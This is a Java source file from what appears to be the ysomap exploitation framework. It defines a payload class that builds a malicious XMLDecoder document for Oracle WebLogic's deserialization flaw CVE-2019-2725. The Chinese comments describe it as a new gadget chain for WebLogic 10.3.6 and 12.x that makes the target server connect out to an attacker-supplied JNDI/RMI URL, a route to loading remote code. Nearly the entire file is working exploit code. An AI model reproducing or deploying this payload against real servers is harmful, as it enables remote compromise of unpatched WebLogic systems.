package ysomap.bullets.weblogic.xml;

import ysomap.bullets.AbstractBullet;
import ysomap.common.annotation.*;

/**
 * new payload founded at 20210408
 * 适用于10.3.6 12.x
 * 需要环境JDK7
 * CVE-2019-2725
 * @author wh1t3P1g
 * @since 2021/4/8
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("使用Weblogic的XML反序列化漏洞，当前为适用于CVE-2019-2725的新利用链。\n" +
        "执行后，可向外部发起JNDI连接")
@Targets({Targets.XMLDECODER})
@Dependencies({"JDK7","weblogic 10.3.6 12.x"})
public class WeblogicXMLJndiBullet extends AbstractBullet<String> {

    @NotNull
    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx:1099/xxx")
    public String jndiURL;

    @Override
    public String getObject() throws Exception {
        return "<java><class><string>weblogic.jms.forwarder.internal.SessionRuntimeContextImpl</string>" +
                "<void><null><string></string></null><string></string><string></string><string>"+
                jndiURL +"</string></void></class>" +
                "</java>";
    }
}
